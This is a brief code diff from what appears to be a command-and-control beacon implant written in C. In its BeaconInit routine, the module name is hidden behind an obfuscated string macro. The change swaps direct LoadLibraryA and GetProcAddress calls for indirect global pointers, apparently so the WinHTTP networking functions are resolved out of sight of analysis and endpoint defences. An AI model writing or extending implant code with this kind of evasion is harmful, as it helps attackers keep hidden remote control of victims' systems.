@@ -86,12 +86,12 @@ static void SelectProfile(void) {
 }
 
 BOOL BeaconInit(void) {
-    HMODULE h = LoadLibraryA(OBFSTR("winhttp.dll"));
+    HMODULE h = g_LoadLibraryA(OBFSTR("winhttp.dll"));
     if (!h) return FALSE;
     SelectProfile();
 
 #define RESOLVE(name) \
-    p##name = (pfn##name)(FARPROC)GetProcAddress(h, #name); \
+    p##name = (pfn##name)(FARPROC)g_GetProcAddress(h, #name); \
     if (!p##name) return FALSE;
 
     RESOLVE(WinHttpOpen)
